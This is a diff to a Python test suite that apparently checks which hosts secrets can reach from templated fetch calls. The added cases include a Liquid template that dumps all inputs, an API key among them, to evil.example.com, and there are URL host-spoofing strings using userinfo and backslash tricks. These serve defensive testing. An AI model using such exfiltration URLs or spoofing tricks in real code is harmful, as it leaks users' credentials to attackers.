@@ -209,6 +209,20 @@ class TestSecretHosts(SimpleTestCase):
                 {"token": UNBOUND, "salt": _hosts()},
             ),
             (
+                "liquid_input_that_dumps_every_input",
+                "fetch(inputs.url, {'method': 'POST'})",
+                {"url": {"value": "https://evil.example.com/{{ inputs | json }}", "templating": "liquid"}},
+                {"api_key"},
+                {"api_key": _hosts("evil.example.com")},
+            ),
+            (
+                "input_that_indexes_a_secret",
+                "fetch(inputs.url, {'method': 'POST'})",
+                _inputs(url="https://hooks.example.com/{inputs['token']}", token="t"),
+                {"token"},
+                {"token": _hosts("hooks.example.com")},
+            ),
+            (
                 "unparseable_code",
                 "fetch(inputs.url, {",
                 _inputs(url="https://hooks.example.com", token="t"),
@@ -237,7 +251,8 @@ class TestSecretHosts(SimpleTestCase):
             ("https://api.example.com:8443/a", _hosts("api.example.com:8443")),
             ("https://api.example.com:443/a", _hosts("api.example.com")),
             ("http://api.example.com:80", _hosts("api.example.com")),
-            ("https://bücher.example/a", _hosts("xn--bcher-kva.example")),
+            ("https://bücher.example/a", UNBOUND),
+            ("https://claßroom.example/a", UNBOUND),
             ("https://good.example.com@evil.example.com/a", UNBOUND),
             # The input is a hog template, which reads the doubled backslash as one literal backslash.
             (r"https://evil.example.com\\@good.example.com/a", UNBOUND),
